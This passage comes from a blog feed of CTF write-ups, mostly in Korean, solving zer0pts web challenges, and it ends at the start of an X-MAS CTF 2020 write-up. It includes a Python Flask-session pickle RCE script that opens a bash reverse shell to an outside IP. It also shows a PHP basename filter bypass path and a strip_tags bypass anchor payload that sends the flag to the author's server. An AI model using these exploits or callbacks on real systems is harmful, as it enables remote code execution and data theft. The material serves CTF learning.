class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">  app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">  app.secret_key = key_</span><br><span class="line">  </span><br><span class="line">  sscsi = SecureCookieSessionInterface()</span><br><span class="line">  signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line">  </span><br><span class="line">  session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line">  print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line">  requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line">  exploit()</span><br></pre></td></tr></table></figure><p>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.35.23.png?raw=true"><br>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</p><blockquote><p>FLAG : zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}</p></blockquote><hr><h2 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h2><blockquote><p>Can you guess it 문제는 PHP 트릭류 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#631F9C">&#62;</span> analysis</p><p>FLAG는 config.php에 정의가 되어 있다고 합니다.</p><p>코드를 보면 <code>$_SERVER[&#39;PHP_SELF&#39;]</code>의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. <code>$_SERVER[&#39;PHP_SELF&#39;]</code>는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 preg_match() 함수를 이용해서 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</p><p>그러다 구글링을 하다가 <a href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</p><blockquote><p>FLAG : zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}</p></blockquote><hr><h2 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h2><blockquote><p>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다.</p><p>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다.</p><p>다시 풀어 더 정확한 풀이를 남기겠습니다.</p><hr><h2 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h2><p>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.54.19.png?raw=true"><br><br>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.57.47.png?raw=true"><br>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</p><p><span style="color:#631F9C">&#62;</span> post.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> util.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.25.19.png?raw=true"><br>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> worker.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 <code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> init.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</p><p>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.54.47.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</p><blockquote><p>FLAG : zer0pts{M4sh1m4fr3sh!!}</p></blockquote><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p>귀찮다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let’s write a Write Up of interesting problems while solving problems in this CTF.</p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eine’s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/main.png?raw=true"></p><hr><h2 id="Programming-Least-Greatest-50-pts"><a href="#Programming-Least-Greatest-50-pts" class="headerlink" title=" (Programming) Least Greatest [50 pts]"></a><span style="color:#21C587"></span> (Programming) Least Greatest [50 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.13.28.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.15.26.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.</p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 